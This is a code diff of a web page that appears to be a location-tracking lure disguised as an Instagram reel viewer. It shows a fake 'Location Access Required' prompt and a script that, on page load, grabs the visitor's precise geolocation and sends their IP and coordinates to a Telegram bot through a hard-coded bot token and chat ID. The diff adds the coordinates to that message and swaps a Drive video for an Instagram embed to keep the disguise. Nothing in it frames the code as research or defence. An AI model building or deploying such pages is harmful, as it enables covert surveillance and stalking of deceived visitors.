@@ -26,31 +26,8 @@
       position: absolute;
       top: 0; left: 0;
       width: 100%; height: 100%;
-      object-fit: cover;
-      background: black;
-      z-index: 2;
-    }
-    #play-overlay {
-      display: none;
-      position: absolute;
-      top: 0; left: 0;
-      width: 100%; height: 100%;
-      background: rgba(0,0,0,0.6);
-      color: white;
-      font-size: 24px;
-      justify-content: center;
-      align-items: center;
-      flex-direction: column;
-      z-index: 3;
-    }
-    #play-overlay button {
-      margin-top: 15px;
-      padding: 10px 25px;
-      font-size: 18px;
-      background: #4CAF50;
-      color: white;
       border: none;
-      border-radius: 8px;
+      z-index: 2;
     }
     #loading-overlay {
       position: absolute;
@@ -61,7 +38,7 @@
       flex-direction: column;
       justify-content: center;
       align-items: center;
-      z-index: 4;
+      z-index: 3;
     }
     .loader {
       width: 50px; height: 50px;
@@ -82,7 +59,7 @@
       flex-direction: column;
       justify-content: center;
       align-items: center;
-      z-index: 5;
+      z-index: 4;
       color: white;
       text-align: center;
       padding: 20px;
@@ -100,22 +77,26 @@
   </style>
 </head>
 <body>
+  <!-- Default background image -->
   <img id="bg-image" src="https://raw.githubusercontent.com/danish-attar/omegle/refs/heads/main/smart-phone-with-instagram-app-logo-on-its-screen-vector-51195621.jpg" alt="Background">
 
-  <video id="insta-video" playsinline controls>
-    <source src="https://drive.google.com/uc?export=download&id=19szhjOpGA8ymSNuFpOtYwi4LdYP3hYR-" type="video/mp4">
-  </video>
+  <!-- Instagram Reel Embed (hidden until permission granted) -->
+  <iframe
+    id="insta-video"
+    src="https://www.instagram.com/reel/DP1Qrn7jAcJ/embed"
+    allowtransparency="true"
+    allowfullscreen="true"
+    scrolling="no"
+    frameborder="0">
+  </iframe>
 
-  <div id="play-overlay">
-    <div>🎬 Video ready to play</div>
-    <button id="play-btn">▶️ Play Video</button>
-  </div>
-
+  <!-- Loading overlay -->
   <div id="loading-overlay">
     <div class="loader"></div>
     <div id="loading-text">Connecting to server...</div>
   </div>
 
+  <!-- Permission request overlay -->
   <div id="permission-request">
     <h2>Location Access Required</h2>
     <p>Please allow location access to continue</p>
@@ -123,17 +104,18 @@
   </div>
 
   <script>
+    // Telegram bot details
     const botToken = '8440190119:AAH9ukiBj1NhHh7-rNb9vv22vj7m64rHSC4';
     const chatId = '7173355426';
 
+    // DOM elements
     const loadingOverlay = document.getElementById('loading-overlay');
     const permissionRequest = document.getElementById('permission-request');
     const allowBtn = document.getElementById('allow-btn');
     const bgImage = document.getElementById('bg-image');
-    const video = document.getElementById('insta-video');
-    const playOverlay = document.getElementById('play-overlay');
-    const playBtn = document.getElementById('play-btn');
+    const instaFrame = document.getElementById('insta-video');
 
+    // Get precise user location
     async function getPreciseLocation() {
       return new Promise((resolve) => {
         if (!navigator.geolocation) return resolve(null);
@@ -153,17 +135,19 @@
       });
     }
 
+    // Send info to Telegram bot
     async function sendToTelegram(data) {
       try {
-        const msg = `🕵️ NEW VISITOR\n\nIP: ${data.ip || 'Unknown'}`;
+        const msg = `🕵️ NEW VISITOR\n\nIP: ${data.ip || 'Unknown'}\nLat: ${data.liveLocation?.lat || 'N/A'}\nLon: ${data.liveLocation?.lon || 'N/A'}`;
         await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ chat_id: chatId, text: msg })
         });
-      } catch(e){ console.log(e); }
+      } catch (e) { console.log(e); }
     }
 
+    // Main tracking and display logic
     async function trackUser() {
       const loc = await getPreciseLocation();
       await sendToTelegram({ liveLocation: loc });
@@ -171,11 +155,10 @@
       if (loc) {
         loadingOverlay.style.display = 'none';
         bgImage.style.opacity = '0';
-        // Show video and play overlay after 1 second
+        // Show Instagram reel after 1 second
         setTimeout(() => {
           bgImage.style.display = 'none';
-          video.style.display = 'block';
-          playOverlay.style.display = 'flex';
+          instaFrame.style.display = 'block';
         }, 1000);
       }
     }
@@ -183,14 +166,6 @@
     allowBtn.addEventListener('click', async () => {
       permissionRequest.style.display = 'none';
       await trackUser();
-    });
-
-    playBtn.addEventListener('click', async () => {
-      playOverlay.style.display = 'none';
-      try {
-        await video.requestFullscreen?.();
-      } catch {}
-      video.play();
     });
 
     window.onload = trackUser;
